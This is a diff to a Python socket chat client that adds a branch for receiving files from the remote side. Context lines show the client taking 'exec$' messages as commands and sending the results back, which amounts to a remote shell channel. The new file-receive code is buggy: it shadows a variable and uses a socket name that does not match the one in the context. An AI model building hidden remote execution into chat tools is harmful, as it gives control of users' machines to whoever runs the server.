@@ -1,5 +1,6 @@
 import socket, select, string, sys, os
 import subprocess
+import tqdm
 
 #Helper function (formatting)
 def display() :
@@ -45,6 +46,8 @@ def main():
 					sys.exit()
 				else :
 					resp = data.split("$")
+					SEPARATOR = "<SEPARATOR>"
+					f = data.split(SEPARATOR)
 					if(resp[0].strip() == "exec"):
 						recv = resp[1]
 						print(recv)
@@ -54,7 +57,31 @@ def main():
 	
 						#send command
 						s.send(res)
+					elif f.__len__() >= 2:
+						#receiving file 
+						BUFFER_SIZE = 4096
 
+						filename = f[0]
+						filesize = f[1]
+						# remove absolute path if there is
+						filename = os.path.basename(filename)
+						# convert to integer
+						print(f)
+						filesize = int(filesize)
+						with open(filename, "wb") as f:
+		
+							it = 0
+							while filesize > it:
+								# read 1024 bytes from the socket (receive)
+								bytes_read = sock.recv(BUFFER_SIZE)
+								if not bytes_read:    
+									# nothing is received
+									# file transmitting is done
+									break
+								# write to the file the bytes we just received
+								f.write(bytes_read)
+
+								it += 4096
 		#user entered a message
 			else :
 				msg=sys.stdin.readline()
